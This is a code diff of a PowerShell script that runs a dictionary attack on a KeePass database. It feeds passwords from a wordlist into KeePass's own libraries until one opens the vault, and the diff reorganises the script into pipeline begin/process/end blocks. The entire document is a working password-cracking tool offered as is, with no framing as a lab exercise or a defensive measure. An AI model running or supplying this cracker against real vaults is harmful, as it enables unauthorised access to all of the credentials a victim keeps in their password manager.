@@ -38,85 +38,73 @@ Get-Content -Encoding UTF8 "c:\software\pwdlist.txt" | Crack-KeePassFile -binpat
 #>
 [CmdletBinding()]
 param(
+    [Parameter(ValueFromPipeline)]
+    $password,
     [Parameter(Mandatory=$true)]
     [string]$binpath,
     [Parameter(Mandatory=$true)]
     [string]$targetfile
 )
 
-function Load-KeePassBinaries {
-    param
-    (
-        [Parameter(Mandatory=$true)]
-        [string]$path
-    )
-    if((Test-Path $path) –eq $false) 
-    {
-        throw [System.ArgumentException] "The path $path is invalid"
-    }
-    try
-    {
-        [Reflection.Assembly]::LoadFile("$path\KeePass.exe")|Out-Null
-        [Reflection.Assembly]::LoadFile("$path\KeePass.XmlSerializers.dll")|Out-Null
-    }
-    catch
-    {
-        throw [System.ArgumentException] "Unable Load KeePass Binaries - check path $path"
-    }
-}
-
-function Try-UnlockDatabase($Database, $IOConnectionInfo, $password)
+begin
 {
-    $Key = New-Object KeePassLib.Keys.CompositeKey
-    $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($password)));
-    try
-    {
-        $Database.Open($IOConnectionInfo,$Key,$null)
-        return $true
+    function Load-KeePassBinaries {
+        param
+        (
+            [Parameter(Mandatory=$true)]
+            [string]$path
+        )
+        if((Test-Path $path) –eq $false) 
+        {
+            throw [System.ArgumentException] "The path $path is invalid"
+        }
+        try
+        {
+            [Reflection.Assembly]::LoadFile("$path\KeePass.exe")|Out-Null
+            [Reflection.Assembly]::LoadFile("$path\KeePass.XmlSerializers.dll")|Out-Null
+        }
+        catch
+        {
+            throw [System.ArgumentException] "Unable Load KeePass Binaries - check path $path"
+        }
     }
-    catch [KeePassLib.Keys.InvalidCompositeKeyException]
-    {
-        return $false
-    }
-}
 
-function Crack-KeePassFile
+    function Try-UnlockDatabase($Database, $IOConnectionInfo, [string]$password)
+    {
+        $Key = New-Object KeePassLib.Keys.CompositeKey
+        $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($password)));
+        try
+        {
+            $Database.Open($IOConnectionInfo,$Key,$null)
+            return $true
+        }
+        catch [KeePassLib.Keys.InvalidCompositeKeyException]
+        {
+            return $false
+        }
+    }
+
+    Load-KeePassBinaries -path $binpath
+    $Database = New-Object KeePassLib.PwDatabase
+    $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
+    $IOConnectionInfo.Path = $targetfile
+    $sw = [Diagnostics.Stopwatch]::StartNew()
+    $count = 0
+}
+process
 {
-    [CmdletBinding()]
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$binpath,
-        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
-        [string]$password,
-        [Parameter(Mandatory=$true)]
-        [string]$targetfile
-    )
-    begin
+    if($count % 1000 -eq 0)
     {
-        Load-KeePassBinaries -path $binpath
-        $Database = New-Object KeePassLib.PwDatabase
-        $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
-        $IOConnectionInfo.Path = $targetfile
-        $sw = [Diagnostics.Stopwatch]::StartNew()
-        $count = 0
+        Write-Output "Number of Keys checked against Database:$count Elapsed Time = $($sw.Elapsed)"
     }
-    process
+    if(Try-UnlockDatabase $Database $IOConnectionInfo $password)
     {
-        if(Try-UnlockDatabase $Database $IOConnectionInfo $password)
-        {
-            Write-Warning "Master Password Found = $password"
-            break
-        }
-        if($count % 1000 -eq 0)
-        {
-            Write-Output "Number of Keys checked against Database:$count Elapsed Time = $($sw.Elapsed)"
-        }
-        $count++
+        Write-Warning "Master Password Found = $password"
+        break
     }
-    end
-    {
-        $sw.Stop()
-    }
+    $count++
 }
-
-$input | Crack-KeePassFile -binpath $binpath -targetfile $targetfile
+end
+{
+    $sw.Stop()
+}
